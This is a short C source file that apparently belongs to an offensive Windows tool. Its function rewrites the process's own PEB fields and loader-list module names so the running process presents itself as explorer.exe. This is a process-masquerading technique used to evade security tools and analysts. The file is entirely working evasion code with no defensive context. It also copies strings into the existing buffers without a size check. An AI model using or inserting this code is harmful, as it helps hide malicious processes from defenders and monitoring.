#include "PebMasquerade.h"
#include "Structs.h"
#include <intrin.h>

static void WriteUnicodeString(PUNICODE_STRING pUs, const WCHAR* wszNew) {
    SIZE_T len = wcslen(wszNew) * sizeof(WCHAR);
    memcpy(pUs->Buffer, wszNew, len + sizeof(WCHAR));
    pUs->Length        = (USHORT)len;
    pUs->MaximumLength = (USHORT)(len + sizeof(WCHAR));
}

BOOL MasqueradePebAsExplorer(void) {
#if defined(_M_X64) || defined(__x86_64__)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    if (!pPeb || !pPeb->ProcessParameters)
        return FALSE;

    PRTL_USER_PROCESS_PARAMETERS pParams = pPeb->ProcessParameters;

    static WCHAR wszFakePath[] = L"C:\\Windows\\explorer.exe";
    static WCHAR wszFakeCmd[]  = L"C:\\Windows\\explorer.exe";

    WriteUnicodeString(&pParams->ImagePathName, wszFakePath);
    WriteUnicodeString(&pParams->CommandLine, wszFakeCmd);

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    if (pLdr) {
        PLIST_ENTRY pHead  = &pLdr->InLoadOrderModuleList;
        PLIST_ENTRY pEntry = pHead->Flink;
        if (pEntry != pHead) {
            PLDR_DATA_TABLE_ENTRY pMainMod = (PLDR_DATA_TABLE_ENTRY)pEntry;
            WriteUnicodeString(&pMainMod->FullDllName, wszFakePath);
            WriteUnicodeString(&pMainMod->BaseDllName, L"explorer.exe");
        }
    }

    return TRUE;
}
